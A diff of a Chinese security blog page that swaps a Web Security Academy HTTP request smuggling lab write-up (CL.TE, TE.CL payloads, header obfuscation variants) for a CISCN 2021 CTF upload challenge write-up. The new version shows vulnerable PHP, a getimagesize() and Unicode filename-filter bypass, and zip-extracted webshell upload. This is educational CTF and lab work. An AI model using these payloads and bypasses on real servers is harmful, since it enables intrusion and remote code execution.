@@ -7,26 +7,24 @@
   
   
   
-  <title>WebSecurityAcademy实验室-Http请求走私 | nappingCat&#39;s Blog</title>
+  <title>ciscn2021 upload | nappingCat&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="0x01  basic CL.TE vulnerability实验描述">
+  <meta name="description" content="ciscn2021 upload源码">
 <meta property="og:type" content="article">
-<meta property="og:title" content="WebSecurityAcademy实验室-Http请求走私">
-<meta property="og:url" content="https://123-prog.github.io/2021/02/12/Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81-WebSecurityAcademy%E5%AE%9E%E9%AA%8C%E5%AE%A4/index.html">
+<meta property="og:title" content="ciscn2021 upload">
+<meta property="og:url" content="https://123-prog.github.io/2021/06/01/ciscn2021-upload/index.html">
 <meta property="og:site_name" content="nappingCat&#39;s Blog">
-<meta property="og:description" content="0x01  basic CL.TE vulnerability实验描述">
+<meta property="og:description" content="ciscn2021 upload源码">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://123-prog.github.io/2021/02/12/Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81-WebSecurityAcademy%E5%AE%9E%E9%AA%8C%E5%AE%A4/Snipaste_2021-02-12_17-31-53.png">
-<meta property="og:image" content="https://123-prog.github.io/2021/02/12/Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81-WebSecurityAcademy%E5%AE%9E%E9%AA%8C%E5%AE%A4/Snipaste_2021-02-12_17-41-59.png">
-<meta property="og:image" content="https://123-prog.github.io/2021/02/12/Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81-WebSecurityAcademy%E5%AE%9E%E9%AA%8C%E5%AE%A4/Snipaste_2021-02-12_17-45-14.png">
-<meta property="og:image" content="https://123-prog.github.io/2021/02/12/Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81-WebSecurityAcademy%E5%AE%9E%E9%AA%8C%E5%AE%A4/Snipaste_2021-02-12_18-14-01.png">
-<meta property="og:image" content="https://123-prog.github.io/2021/02/12/Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81-WebSecurityAcademy%E5%AE%9E%E9%AA%8C%E5%AE%A4/Snipaste_2021-02-12_19-59-33.png">
-<meta property="article:published_time" content="2021-02-12T09:29:05.000Z">
-<meta property="article:modified_time" content="2021-04-05T02:33:39.878Z">
+<meta property="og:image" content="https://123-prog.github.io/2021/06/01/ciscn2021-upload/Snipaste_2021-06-01_00-06-04.png">
+<meta property="og:image" content="https://123-prog.github.io/2021/06/01/ciscn2021-upload/Snipaste_2021-05-31_23-11-51.png">
+<meta property="og:image" content="https://123-prog.github.io/2021/06/01/ciscn2021-upload/Snipaste_2021-06-01_00-11-53.png">
+<meta property="article:published_time" content="2021-06-01T01:35:23.000Z">
+<meta property="article:modified_time" content="2021-06-01T01:59:15.402Z">
 <meta property="article:author" content="nappingCat">
-<meta property="article:tag" content="http smuggling">
+<meta property="article:tag" content="文件上传 getimagesize绕过 mb_strtolower()的利用">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://123-prog.github.io/2021/02/12/Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81-WebSecurityAcademy%E5%AE%9E%E9%AA%8C%E5%AE%A4/Snipaste_2021-02-12_17-31-53.png">
+<meta name="twitter:image" content="https://123-prog.github.io/2021/06/01/ciscn2021-upload/Snipaste_2021-06-01_00-06-04.png">
   
     <link rel="alternative" href="/atom.xml" title="nappingCat&#39;s Blog" type="application/atom+xml">
   
@@ -252,11 +250,11 @@
         </header>
     </div>
 </nav>
-      <div class="body-wrap"><article id="post-Http请求走私-WebSecurityAcademy实验室" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-ciscn2021-upload" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a  href="/2021/02/12/Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81-WebSecurityAcademy%E5%AE%9E%E9%AA%8C%E5%AE%A4/" class="article-date">
-      <time datetime="2021-02-12T09:29:05.000Z" itemprop="datePublished">2021-02-12</time>
+      <a  href="/2021/06/01/ciscn2021-upload/" class="article-date">
+      <time datetime="2021-06-01T01:35:23.000Z" itemprop="datePublished">2021-06-01</time>
 </a>
 
     </div>
@@ -270,7 +268,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      WebSecurityAcademy实验室-Http请求走私
+      ciscn2021 upload
     </h1>
   
 
@@ -282,7 +280,7 @@
 
         
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/http-smuggling/" rel="tag">http smuggling</a></li></ul>
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-getimagesize%E7%BB%95%E8%BF%87-mb-strtolower-%E7%9A%84%E5%88%A9%E7%94%A8/" rel="tag">文件上传 getimagesize绕过 mb_strtolower()的利用</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -292,47 +290,25 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h3 id="0x01-basic-CL-TE-vulnerability"><a href="#0x01-basic-CL-TE-vulnerability" class="headerlink" title="0x01  basic CL.TE vulnerability"></a>0x01  basic CL.TE vulnerability</h3><p>实验描述</p>
-<p><img src="/2021/02/12/Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81-WebSecurityAcademy%E5%AE%9E%E9%AA%8C%E5%AE%A4/Snipaste_2021-02-12_17-31-53.png"></p>
+        <h2 id="ciscn2021-upload"><a href="#ciscn2021-upload" class="headerlink" title="ciscn2021 upload"></a>ciscn2021 upload</h2><p>源码</p>
 <a id="more"></a>
 
-<p>需要完成的任务是让下一次请求报出GPOST方法错误，我们需要走私一个大写字母G，这样下一次请求就不是POST，而是GPOST</p>
-<p>前端代理服务器使用Content-Length头，后端服务器使用Transfer-Encoding头，我们就可以在消息头构造出长度为0的消息块，这样前端服务器会将其当作是消息的一部分，而后端服务器会以为这里是消息体的结束位置，把后面的那些内容当作是下一次请求的开始</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;HTTP&#x2F;1.1</span><br><span class="line">Host: aca91fdb1ec4f6128055f5bb009b00c4.web-security-academy.net</span><br><span class="line">...</span><br><span class="line">Content-Length: 6</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">G</span><br></pre></td></tr></table></figure>
-<p>这里0后面是两个换行（/r/n/r/n)，4个字节长度，用bp得记住把repeater的自动更新CL头的功能关闭</p>
-<p><img src="/2021/02/12/Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81-WebSecurityAcademy%E5%AE%9E%E9%AA%8C%E5%AE%A4/Snipaste_2021-02-12_17-41-59.png"></p>
-<p>把上面的构造的请求发送给服务器，再请求一次就会发现提示错误请求GPOST。</p>
-<p><img src="/2021/02/12/Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81-WebSecurityAcademy%E5%AE%9E%E9%AA%8C%E5%AE%A4/Snipaste_2021-02-12_17-45-14.png"></p>
-<p>两次请求差不多像这样：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;HTTP&#x2F;1.1</span><br><span class="line">Host: aca91fdb1ec4f6128055f5bb009b00c4.web-security-academy.net</span><br><span class="line">...</span><br><span class="line">Content-Length: 6</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GPOST &#x2F;HTTP&#x2F;1.1</span><br><span class="line">Host: aca91fdb1ec4f6128055f5bb009b00c4.web-security-academy.net</span><br><span class="line">...</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
-<p>上一次请求的G直接附在了下一次请求的方法头部，让POST方法变成了GPOST</p>
-<h3 id="0x02-basic-TE-CL-vulnerability"><a href="#0x02-basic-TE-CL-vulnerability" class="headerlink" title="0x02 basic TE.CL vulnerability"></a>0x02 basic TE.CL vulnerability</h3><p>要求与第一个实验一样，只是这里反向代理和后端服务器所使用识别的头更改了，前端使用Transfer-Encoding标头，后端使用Content-Length标头</p>
-<p>因为前端服务器使用TE头，所以我们的消息体中就必须包含一个长度为0的块闭合消息体，为了影响下一次请求，改变下一次请求方式，我们必须自己为下一次请求构造一个请求头</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;HTTP&#x2F;1.1</span><br><span class="line">Host: aca91fdb1ec4f6128055f5bb009b00c4.web-security-academy.net</span><br><span class="line">...</span><br><span class="line">Content-Length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">5c</span><br><span class="line">GPOST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 15</span><br><span class="line"></span><br><span class="line">x&#x3D;1</span><br><span class="line">0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>前端的代理服务器识别TE头，则会把消息体看成是两个消息块，第一个长度为5C,第二个为0，结束的标志</p>
-<p>后端服务器使用CL头，由于长度只有4,所以除了5c和一个换行符，下面的所有消息会被当作是下一次请求的开始，这里我们直接构造好了请求头，把实际的第二次请求当作了消息体的一部分，两次请求如：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;HTTP&#x2F;1.1</span><br><span class="line">Host: aca91fdb1ec4f6128055f5bb009b00c4.web-security-academy.net</span><br><span class="line">...</span><br><span class="line">Content-Length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">5c</span><br><span class="line">GPOST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 15</span><br><span class="line"></span><br><span class="line">x&#x3D;1</span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">POST &#x2F;HTTP&#x2F;1.1</span><br><span class="line">Host: aca91fdb1ec4f6128055f5bb009b00c4.web-security-academy.net</span><br><span class="line">...</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
-<p>第一次请求原本应该是到0那里结束，但我们构造了CL的大小，导致第一次请求到5c换行后就结束了，后面的都是第二次请求的内容，而第二次请求原本是在0后面开始</p>
-<p>两次请求的结果</p>
-<p><img src="/2021/02/12/Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81-WebSecurityAcademy%E5%AE%9E%E9%AA%8C%E5%AE%A4/Snipaste_2021-02-12_18-14-01.png"></p>
-<h3 id="0x03-obfuscating-the-TE-header"><a href="#0x03-obfuscating-the-TE-header" class="headerlink" title="0x03 obfuscating the TE header"></a>0x03 obfuscating the TE header</h3><p>实验要求：</p>
-<p><img src="/2021/02/12/Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81-WebSecurityAcademy%E5%AE%9E%E9%AA%8C%E5%AE%A4/Snipaste_2021-02-12_19-59-33.png"></p>
-<p>混淆TE头，使得下一次请求的方法变更为GPOST</p>
-<p>混淆TE头有很多种方法，可以多试几种</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Transfer-Encoding: xchunked</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Transfer-Encoding : chunked</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Transfer-Encoding: x</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Transfer-Encoding:[tab]chunked</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[space]Transfer-Encoding: chunked</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X: X[\n]Transfer-Encoding: chunked</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Transfer-Encoding</span><br><span class="line">: chunked</span><br></pre></td></tr></table></figure>
-<p>经过尝试，第三种可行</p>
-<p>混淆之后。对于头部</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Transfer-Encoding: x</span><br></pre></td></tr></table></figure>
-<p>前端服务器会认为这个就是传输编码的方式，是一个有效的头部，故前端会选择TE头去理解消息体，后端则认为这是一个有问题的头部，如果此时存在Content-Length标头，后端服务器就会选择Content-Length去理解消息体。这样就跟前面的TE.CL一样了</p>
-<p>请求如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;HTTP&#x2F;1.1</span><br><span class="line">Host: aca91fdb1ec4f6128055f5bb009b00c4.web-security-academy.net</span><br><span class="line">...</span><br><span class="line">Content-Length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Transfer-Encoding: x</span><br><span class="line"></span><br><span class="line">5c</span><br><span class="line">GPOST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 15</span><br><span class="line"></span><br><span class="line">x&#x3D;1</span><br><span class="line">0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>连续两次请求得到“Unrecognized method GPOST”</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;ctf&quot;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;ctf&quot;</span>]))</span><br><span class="line">    <span class="variable">$ctf</span> = <span class="variable">$_GET</span>[<span class="string">&quot;ctf&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctf</span>==<span class="string">&quot;upload&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&#x27;postedFile&#x27;</span>][<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1024</span>*<span class="number">512</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;这么大个的东西你是想d我吗？&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$imageinfo</span> = getimagesize(<span class="variable">$_FILES</span>[<span class="string">&#x27;postedFile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$imageinfo</span> === <span class="literal">FALSE</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;如果不能好好传图片的话就还是不要来打扰我了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$imageinfo</span>[<span class="number">0</span>] !== <span class="number">1</span> &amp;&amp; <span class="variable">$imageinfo</span>[<span class="number">1</span>] !== <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;东西不能方方正正的话就很讨厌&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$fileName</span>=urldecode(<span class="variable">$_FILES</span>[<span class="string">&#x27;postedFile&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(stristr(<span class="variable">$fileName</span>,<span class="string">&quot;c&quot;</span>) || stristr(<span class="variable">$fileName</span>,<span class="string">&quot;i&quot;</span>) || stristr(<span class="variable">$fileName</span>,<span class="string">&quot;h&quot;</span>) || stristr(<span class="variable">$fileName</span>,<span class="string">&quot;ph&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;有些东西让你传上去的话那可不得了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$imagePath</span> = <span class="string">&quot;image/&quot;</span> . mb_strtolower(<span class="variable">$fileName</span>);</span><br><span class="line">    <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&quot;postedFile&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="variable">$imagePath</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;upload success, image at <span class="subst">$imagePath</span>&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;传都没有传上去&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>隐藏文件<code>example.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;ctf&quot;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;ctf&quot;</span>]))</span><br><span class="line">    <span class="variable">$ctf</span> = <span class="variable">$_GET</span>[<span class="string">&quot;ctf&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctf</span>==<span class="string">&quot;poc&quot;</span>) &#123;</span><br><span class="line">    <span class="variable">$zip</span> = <span class="keyword">new</span> \ZipArchive();</span><br><span class="line">    <span class="variable">$name_for_zip</span> = <span class="string">&quot;example/&quot;</span> . <span class="variable">$_POST</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span>(explode(<span class="string">&quot;.&quot;</span>,<span class="variable">$name_for_zip</span>)[count(explode(<span class="string">&quot;.&quot;</span>,<span class="variable">$name_for_zip</span>))<span class="number">-1</span>]!==<span class="string">&quot;zip&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;要不咱们再看看？&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$zip</span>-&gt;open(<span class="variable">$name_for_zip</span>) !== <span class="literal">TRUE</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span> (<span class="string">&quot;都不能解压呢&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;可以解压，我想想存哪里&quot;</span>;</span><br><span class="line">    <span class="variable">$pos_for_zip</span> = <span class="string">&quot;/tmp/example/&quot;</span> . md5(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]);</span><br><span class="line">    <span class="variable">$zip</span>-&gt;extractTo(<span class="variable">$pos_for_zip</span>);</span><br><span class="line">    <span class="variable">$zip</span>-&gt;close();</span><br><span class="line">    unlink(<span class="variable">$name_for_zip</span>);</span><br><span class="line">    <span class="variable">$files</span> = glob(<span class="string">&quot;<span class="subst">$pos_for_zip</span>/*&quot;</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_dir(<span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$first</span> = imagecreatefrompng(<span class="variable">$file</span>);</span><br><span class="line">        <span class="variable">$size</span> = min(imagesx(<span class="variable">$first</span>), imagesy(<span class="variable">$first</span>));</span><br><span class="line">        <span class="variable">$second</span> = imagecrop(<span class="variable">$first</span>, [<span class="string">&#x27;x&#x27;</span> =&gt; <span class="number">0</span>, <span class="string">&#x27;y&#x27;</span> =&gt; <span class="number">0</span>, <span class="string">&#x27;width&#x27;</span> =&gt; <span class="variable">$size</span>, <span class="string">&#x27;height&#x27;</span> =&gt; <span class="variable">$size</span>]);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$second</span> !== <span class="literal">FALSE</span>) &#123;</span><br><span class="line">            <span class="variable">$final_name</span> = pathinfo(<span class="variable">$file</span>)[<span class="string">&quot;basename&quot;</span>];</span><br><span class="line">            imagepng(<span class="variable">$second</span>, <span class="string">&#x27;example/&#x27;</span>.<span class="variable">$final_name</span>);</span><br><span class="line">            imagedestroy(<span class="variable">$second</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        imagedestroy(<span class="variable">$first</span>);</span><br><span class="line">        unlink(<span class="variable">$file</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>大概的功能是在<code>index.php</code>处可以上传文件，在<code>example.php</code>处可以解压zip文件，而且路径全部可知</p>
+<p>所以思路是 在<code>index.php</code>处上传一个zip压缩包，再利用<code>example.php</code>解压压缩包，将压缩包里的恶意文件放在指定路径，因为这里对压缩包里面的文件有一些图片处理，如果不是图片过不了，但我们可以传一个图片马，改一下后缀就可以</p>
+<p>生成一个图片马，改后缀为<code>php</code>，压缩成zip</p>
+<p>上传zip文件</p>
+<p>由于对上传文件后缀名有过滤，但注意到后面的<code>mb_strtolower()</code>，可以用一些Unicode字符代替</p>
+<p>这里用<code>İ(%c4%b0)</code>绕过对<code>i</code>的过滤</p>
+<p><code>getimagesize()</code>绕过：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#define width 1</span><br><span class="line">#define height 1</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/06/01/ciscn2021-upload/Snipaste_2021-06-01_00-06-04.png"></p>
+<p>然后再利用<code>example.php</code>对<code>1.zip</code>进行解压</p>
+<p><img src="/2021/06/01/ciscn2021-upload/Snipaste_2021-05-31_23-11-51.png"></p>
+<p>最后直接访问<code>example/1.php</code>拿到shell</p>
+<p><img src="/2021/06/01/ciscn2021-upload/Snipaste_2021-06-01_00-11-53.png"></p>
 
       
     </div>
@@ -341,13 +317,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a  href="/2021/02/12/Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81-WebSecurityAcademy%E5%AE%9E%E9%AA%8C%E5%AE%A4/">WebSecurityAcademy实验室-Http请求走私</a></p>
+        <p><span>本文标题:</span><a  href="/2021/06/01/ciscn2021-upload/">ciscn2021 upload</a></p>
         <p><span>文章作者:</span><a  href="/" title="访问 nappingCat 的个人博客">nappingCat</a></p>
-        <p><span>发布时间:</span>2021年02月12日 - 17时29分</p>
-        <p><span>最后更新:</span>2021年04月05日 - 10时33分</p>
+        <p><span>发布时间:</span>2021年06月01日 - 09时35分</p>
+        <p><span>最后更新:</span>2021年06月01日 - 09时59分</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2021/02/12/Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81-WebSecurityAcademy%E5%AE%9E%E9%AA%8C%E5%AE%A4/" title="WebSecurityAcademy实验室-Http请求走私">https://123-prog.github.io/2021/02/12/Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81-WebSecurityAcademy%E5%AE%9E%E9%AA%8C%E5%AE%A4/</a>
-            <span class="copy-path" data-clipboard-text="原文: https://123-prog.github.io/2021/02/12/Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81-WebSecurityAcademy%E5%AE%9E%E9%AA%8C%E5%AE%A4/　　作者: nappingCat" title=""></span>
+            <span>原始链接:</span><a class="post-url" href="/2021/06/01/ciscn2021-upload/" title="ciscn2021 upload">https://123-prog.github.io/2021/06/01/ciscn2021-upload/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://123-prog.github.io/2021/06/01/ciscn2021-upload/　　作者: nappingCat" title=""></span>
         </p>
         <p>
             <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target = "_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
@@ -358,18 +334,9 @@
 
 <nav id="article-nav">
   
-    <a  href="/2021/02/12/Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption"><</strong>
-      <div class="article-nav-title">
-        
-          Http请求走私（smuggling)学习记录
-        
-      </div>
-    </a>
   
-  
-    <a  href="/2021/02/11/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">无列名注入</div>
+    <a  href="/2021/05/18/CISCN2021-web%E9%83%A8%E5%88%86wp/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">CISCN 2021 web 部分wp</div>
       <strong class="article-nav-caption">></strong>
     </a>
   
@@ -381,7 +348,7 @@
 
     <div id="toc" class="toc-article">
     <strong class="toc-title">文章目录</strong>
